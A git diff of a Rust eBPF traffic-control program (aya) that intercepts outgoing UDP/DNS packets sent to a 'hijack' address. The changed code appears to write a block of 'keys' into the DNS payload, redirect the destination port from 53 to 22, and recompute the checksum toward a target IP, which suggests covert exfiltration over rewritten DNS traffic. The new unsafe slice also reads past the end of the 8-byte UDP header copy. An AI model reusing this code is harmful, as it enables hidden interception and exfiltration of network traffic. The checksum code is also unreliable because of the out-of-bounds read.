@@ -1,4 +1,4 @@
-use core::net::Ipv4Addr;
+use core::{net::Ipv4Addr, slice};
 
 use aya_ebpf::{
     bindings::{__sk_buff, TC_ACT_OK, TC_ACT_PIPE},
@@ -19,9 +19,10 @@ use network_types::{
 };
 
 use crate::common::{
-    BPF_ADJ_ROOM_NET, BPF_F_MARK_ENFORCE, BPF_F_MARK_MANGLED_0, BPF_F_PSEUDO_HDR, DNS_QUERY_OFFSET,
-    HIJACK_IP, IP_CSUM_OFFSET, IP_DEST_ADDR_OFFSET, IP_OFFSET, IP_TOT_LEN_OFFSET, TARGET_IP,
-    UDP_CSUM_OFFSET, UDP_DEST_PORT_OFFSET, UDP_LEN_OFFSET, UDP_OFFSET,
+    calculate_udp_checksum, BPF_ADJ_ROOM_NET, BPF_F_MARK_ENFORCE, BPF_F_MARK_MANGLED_0,
+    BPF_F_PSEUDO_HDR, DNS_QUERY_OFFSET, HIJACK_IP, IP_CSUM_OFFSET, IP_DEST_ADDR_OFFSET, IP_OFFSET,
+    IP_TOT_LEN_OFFSET, TARGET_IP, UDP_CSUM_OFFSET, UDP_DEST_PORT_OFFSET, UDP_LEN_OFFSET,
+    UDP_OFFSET,
 };
 
 // Maps
@@ -179,10 +180,7 @@ fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
         let addr = header.dst_addr;
         if let IpProto::Udp = header.proto {
             if addr == hijack_ip {
-                let dns_payload_len =
-                    u16::from_be(ctx.load::<UdpHdr>(UDP_OFFSET).map_err(|_| ())?.len) - 8;
                 info!(&ctx, "\n-----\nNew intercepted request:\n-----");
-                info!(&ctx, "payload sz {}  ", dns_payload_len);
 
                 let udp_hdr: UdpHdr = ctx.load::<UdpHdr>(UDP_OFFSET).map_err(|_| ())?;
                 let dns_payload: [u8; 50] =
@@ -247,19 +245,34 @@ fn tc_process_egress(ctx: TcContext) -> Result<i32, ()> {
                     DNS_QUERY_OFFSET as u32 + 50,
                     &keys_as_u32.to_be(),
                 );
-                update_udp_hdr_len(
-                    &ctx,
-                    skb,
-                    &udp_hdr.len,
-                    &(u16::from_be(udp_hdr.len) + offset as u16).to_be(),
+                let new_udphdr_len = u16::from_be(udp_hdr.len) + offset as u16;
+                update_udp_hdr_len(&ctx, skb, &udp_hdr.len, &(new_udphdr_len).to_be());
+
+                update_dst_port(&ctx, skb, &53u16.to_be(), &22u16.to_be());
+
+                //recompute checksum layer 4
+                let udp_hdr_ptr =
+                    &ctx.load::<UdpHdr>(UDP_OFFSET).map_err(|_| ())? as *const UdpHdr as *const u8;
+
+                let udp_hdr_bytes_repr = unsafe {
+                    // Convert the raw pointer and length into a byte slice using core::slice::from_raw_parts
+                    slice::from_raw_parts(udp_hdr_ptr, new_udphdr_len as usize)
+                };
+                let new_dns_payload_ptr =
+                    ctx.load::<[u8; 50 + 4]>(DNS_QUERY_OFFSET).map_err(|_| ())?;
+
+                let new_cs = calculate_udp_checksum(
+                    u32::from_be(header.src_addr),
+                    target_ip,
+                    udp_hdr_bytes_repr,
+                    &new_dns_payload_ptr[..],
                 );
 
-                update_dst_port(&ctx, skb, &53u16.to_be(), &54u16.to_be());
                 if unsafe {
                     bpf_skb_store_bytes(
                         skb.skb,
                         UDP_CSUM_OFFSET as u32,
-                        &0u16 as *const u16 as *const c_void,
+                        &new_cs as *const u16 as *const c_void,
                         2,
                         2,
                     )
